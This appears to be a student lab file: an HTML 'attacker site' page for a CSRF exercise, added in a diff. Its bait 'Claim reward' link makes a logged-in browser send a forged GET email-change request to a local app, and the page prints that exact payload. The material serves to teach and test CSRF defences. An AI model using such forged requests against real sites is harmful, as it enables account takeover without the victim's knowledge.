@@ -1,0 +1,6 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Attacker · forged GET</title><link rel="stylesheet" href="/static/style.css"></head>
+<body><main><p class="eyebrow">ATTACKER SITE / localhost:8001</p><h1>Claim your demo reward</h1><section><p>This lab's bait link navigates the logged-in browser to a forged email-change request. The attacker does not know or read the victim's cookie or CSRF token.</p>
+<!-- EXACT PAYLOAD: top-level GET includes SameSite=Lax login cookies. -->
+<a class="button" href="http://127.0.0.1:5000/change-email?email=attacker%40example.test">Claim reward</a>
+<p>Exact payload:</p><code>http://127.0.0.1:5000/change-email?email=attacker%40example.test</code><p>Use this unchanged link for both the vulnerable and secure trials.</p></section><p>Saqlain · IIT2024113 · GET-based forged action</p></main></body></html>
